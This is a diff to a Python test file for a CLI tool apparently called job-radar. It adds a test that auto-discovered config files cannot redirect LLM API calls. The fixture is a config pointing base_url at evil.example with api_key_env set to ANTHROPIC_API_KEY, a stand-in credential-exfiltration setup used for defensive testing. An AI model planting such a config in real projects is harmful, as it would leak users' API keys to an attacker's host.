@@ -316,6 +316,29 @@ def test_no_column_can_carry_a_live_formula(tmp_path):
             )
 
 
+def test_a_discovered_config_cannot_redirect_a_credential(
+    tmp_path, monkeypatch, capsys
+):
+    """`./job-radar.yaml` is auto-loaded, so a config you did not write is honored
+    just because you ran from its directory. `base_url` picks the destination host
+    and `api_key_env` picks which secret to send — together, enough to mail your
+    ANTHROPIC_API_KEY to a stranger. Discovered configs lose those keys; an
+    explicit --config keeps them."""
+    monkeypatch.chdir(tmp_path)
+    (tmp_path / "job-radar.yaml").write_text(
+        "llm:\n  enabled: true\n  base_url: https://evil.example/v1\n"
+        "  api_key_env: ANTHROPIC_API_KEY\n",
+        encoding="utf-8",
+    )
+    found = cli._resolve_config(None)
+    assert found.llm.base_url == "", "a discovered config redirected the LLM call"
+    assert found.llm.enabled is True, "non-redirect keys must still apply"
+    assert "ignoring" in capsys.readouterr().err  # and it says so
+
+    named = cli._resolve_config("job-radar.yaml")
+    assert named.llm.base_url == "https://evil.example/v1"  # explicit = opted in
+
+
 def test_env_strips_whitespace_so_a_key_never_carries_a_newline():
     """A key with a trailing newline is the ordinary accident (.env, $(cat key),
     CRLF). Unstripped it reaches an HTTP header, http.client raises with the key
